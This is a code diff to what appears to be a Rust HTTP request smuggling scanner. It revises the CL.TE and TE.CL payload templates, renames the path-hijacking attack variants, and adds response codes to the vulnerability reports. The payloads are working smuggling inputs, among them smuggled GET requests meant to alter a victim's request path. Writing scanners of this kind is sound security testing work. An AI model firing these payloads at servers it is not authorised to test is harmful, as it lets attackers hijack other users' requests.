@@ -27,12 +27,14 @@ A\r\n\
 
         AttackType::TeClTime => format!("\
 {}\
-Content-Length: 6\r\n\
+Content-Length: 12\r\n\
 Transfer-Encoding: chunked\r\n\
 \r\n\
+1\r\n\
+A\r\n\
 0\r\n\
 \r\n\
-G", request),
+A", request),
 
         AttackType::ClTeMethod => format!("\
 {}\
@@ -48,6 +50,7 @@ G", request),
 GGET {} HTTP/1.1\r\n\
 Host: {}\r\n\
 Accept: */*\r\n\
+Content-Length: 9\r\n\
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\r\n\
 Accept-Encoding: gzip\r\n\
 \r\n\
@@ -68,7 +71,7 @@ x=", &config.path, &config.host);
             request
         },
 
-        AttackType::ClTeNotfound => {
+        AttackType::ClTePath => {
             let payload: String = format!("\
 0\r\n\
 \r\n\
@@ -77,6 +80,7 @@ Host: {}\r\n\
 Accept: */*\r\n\
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\r\n\
 Accept-Encoding: gzip\r\n\
+Content-Length: 9\r\n\
 \r\n\
 x=", &config.host);
             let mut request = config.print();
@@ -88,7 +92,7 @@ x=", &config.host);
             request
         },
 
-        AttackType::TeClNotfound => {
+        AttackType::TeClPath => {
             let payload: String = format!("\
 GET /so404mething HTTP/1.1\r\n\
 Host: {}\r\n\
@@ -201,11 +205,13 @@ pub fn found(
 Possible Cl Te request smuggling vulnerability found
 Reason: Time delay with the wrong Content-Length header observed
 
-Request with the wrong Content-Length header({}ms):\n{}
+Request with the wrong Content-Length header({}, {}ms):\n{}
 
-Usual request({}ms):\n{}",
+Usual request({}, {}ms):\n{}",
+            first_response.code,
             first_response.time,
             color_request(&first_request),
+            second_response.code,
             second_response.time,
             color_request(&second_request)
         ).ok(),
@@ -214,11 +220,13 @@ Usual request({}ms):\n{}",
 Possible Te Cl request smuggling vulnerability found
 Reason: Time delay with the wrong chunk size observed
 
-Request with the wrong chunk size({}ms):\n{}
+Request with the wrong chunk size({}, {}ms):\n{}
 
-Usual request({}ms):\n{}",
+Usual request({}, {}ms):\n{}",
+            first_response.code,
             first_response.time,
             color_request(&first_request),
+            second_response.code,
             second_response.time,
             color_request(&second_request)
         ).ok(),
@@ -238,7 +246,7 @@ Usual response:\n{}",
             first_response.print(),
             second_response.print()
         ).ok(),
-        AttackType::ClTeNotfound => writeln!(io::stdout(),
+        AttackType::ClTePath => writeln!(io::stdout(),
             "\
 Possible Cl Te request smuggling vulnerability found
 Reason: It was possible to change victim's path
@@ -270,7 +278,7 @@ Usual response:\n{}",
             first_response.print(),
             second_response.print()
         ).ok(),
-        AttackType::TeClNotfound => writeln!(io::stdout(),
+        AttackType::TeClPath => writeln!(io::stdout(),
             "\
 Possible Cl Te request smuggling vulnerability found
 Reason: It was possible to change victim's path
